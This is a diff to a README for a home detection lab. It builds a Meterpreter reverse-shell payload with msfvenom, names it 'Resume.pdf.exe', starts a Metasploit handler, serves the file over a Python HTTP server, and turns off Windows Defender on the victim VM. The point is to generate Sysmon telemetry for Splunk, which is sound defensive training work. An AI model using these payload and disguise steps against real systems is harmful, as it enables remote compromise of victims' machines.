@@ -61,7 +61,7 @@ Now you can start the Kali virtual machine. Note: The default credentials of the
 
 ![Start Kali Linux](./assets/start-kali-linux.png)
 
-## Important:
+### Important:
 
 In order to prevent your host machine to get infected, first you need to properly configure the virtual machines.
 
@@ -167,3 +167,102 @@ Now, in the Powershell console, type `.\Sysmon64.exe -i .\sysmonconfig.xml` and 
 To install Splunk, just navigate to the [Splunk website](https://www.splunk.com/) and download `Splunk enterprise`. You'll need to create an account for it.
 Run the installer and when prompt about which type of installation select `Local System`, create a username and a password and click in Install.
 Once installed, open your browser and Splunk should be installed in your `localhost` in the `8000` port.
+
+## 7. Establish a reverse TCP shell in the attacker machine:
+
+As a first step, open a terminal in the Kali machine and run `ifconfig` or `ip a` and take note of your IP address, as it will be needed to build the malware.
+
+Next, run `nmap -A 192.168.20.10 -Pn`, (replace `192.168.20.10` with the IP address of the Windows machine if it's different in your case). Running this command, nmap will start scanning all the ports and indentifying any of them that are open. 
+
+```sh
+    # Note: 
+
+    nmap -A 192.168.20.10 -Pn
+
+    # -A: Aggressive scan mode. This enables OS detection, version detection, etc.
+    # -Pn: Tells Nmap not to ping the host first to see if it's online. 
+```
+
+After Nmap finishes the scan, we notice that the port 3389 is open:
+
+![](./assets/3389-open.png)
+
+Now it's time to create a basic malware using Msfvenom and Meterpreter reverse shell as payload (to get a list of the payload run `msfvenom -l payloads`), I will use `windows/x64/meterpreter_reverse_tcp`.
+
+Run this command:
+
+```sh
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe` 
+```
+
+What this command is doing is generate malware using Meterpreter's reverse TCP payload, which is instructed to connect back to our attacker machine, based in the `lhost` (192.168.20.11 in my case) and the `port` (the default port for meterpreter is `4444` but you can customize it). The file format will be an .exe as we specified and the file name will be `Resume.pdf.exe`.
+
+![](./assets/generating-reverse-tcp-malware.png)
+
+To check the file details just run `file Resume.pdf.exe`.
+
+Now let's open a handler to listen in on the port that we configured in the malware, to do that open up Metasploit by typing `msfconsole`. Once in the console, we'll use the multi-handler by running `use exploit/multi/handler`, after that we should be in the exploit itself.
+Type `options` to see possible configurations:
+
+![](./assets/multihandler-options.png)
+
+Notice that the payload options are now set to `generic/shell_reverse_tcp`. Wee need to change this payload to be the same payload that we used configuring our Msfvenom malware., to do that run `set payload windows/x64/meterpreter_reverse_tcp`. Now we need to configure the lhost of the attacker machine, for that run `set lhost 192.168.20.11`.
+To check this changes, just run `options` again.
+
+Now, to start the handler type `exploit`:
+
+![](./assets/exploit-waiting.png)
+
+The attacker machine is now listening and waiting for the victim machine to execute the malware.
+
+Now we need to set up a quick HTTP server on our Kali machine, so our victim machine can download the malware. In this case I'll do it using Python. Open a new terminal in the same directory of the malware and tpe `python3 -m http.server 9999` (Or use another port that is not in use). 
+
+![](./assets/run-http-server.png)
+
+This allow our victim machine to access the attacker machine an start downloading malware from there.
+
+## 8. Execute the malware in the victim machine:
+
+First, open up the Windows 10 machine and head over to Security Center, under Virus & threat protection click on Manage settings, once there, turn-off Real-time protection.
+
+![](./assets/disable-realtime-protection.png)
+
+Now, open a web browser and type in the IP of the Kali machine port and the port you establish for the connection, there, you'll see the file created ready to download it.
+
+![](./assets/download-malware.png)
+
+Once downloaded, open the file, and when Windows pop-up a security screen click on `Run anyway`. 
+Now the malware has been executed. To check it, open a Command prompt with administrator privileges and type `netstat -anob`. We will scroll and look for an established connection to the attacker machine, in my case, here it is:
+
+![](./assets/tcp-connection-stablished.png)
+
+If we open the Task manager, go to the Details tab and you can check the execution of the Resume.pdf.exe malware running by its PID:
+
+![](./assets/check-malware-taskmng.png)
+
+Now let's head back to the terminal of the attacker machine and type a few commands to generate telemetry: Run `shell`, `net user`, `net localgroup` and `ipconfig`. 
+
+## 9. Check telemetry with Splunk:
+
+Back in our Windows machine, first, we need to make that Splunk is configured to ingest Sysmon logs. In order to do that, go to the installation directory of Splunk (typically in inside Program files) and follow this route `etc > system > local` and you should see and `inputs.conf` file, if it's not there just copy it from `etc > system > default`.
+
+![](./assets/check-inputsconf.png)
+
+Edit the `inputs.conf` file and make sure Sysmon is configured like in the image:
+
+![](./assets/inputsconf.png)
+
+Now, make sure to restart the Splunkd Service.
+
+![](./assets/restart-splunkd.png)
+
+We are basically telling Splunk to look into `Microsoft-Windows-Sysmon/Operational`, take all the events and feed it into `index = endpoint`. So once in Splunk we need to specify to have an `index` named `endpoint`. , otherwise, splunk would not what to do with all the Sysmon events.
+In Splunk, go to `Settings` and then `Indexes` and create a new index called `endpoint`, make sure the endpoint exists and is not disabled. 
+
+![](./assets/endpoint-index-enabled.png)
+
+Now go to `Apps` and then `Search & Reporting` and in the searchbox type `index=endpoint` and you will see that a lot of data has been ingested Note that Splunk is not automatically parsing Sysmon, so to do it, we need to install an App called Splunk Add-on for Sysmon).
+
+![](./assets/data-ingested.png)
+
+So now we started generating telemetry and we can start playing with Splunk.
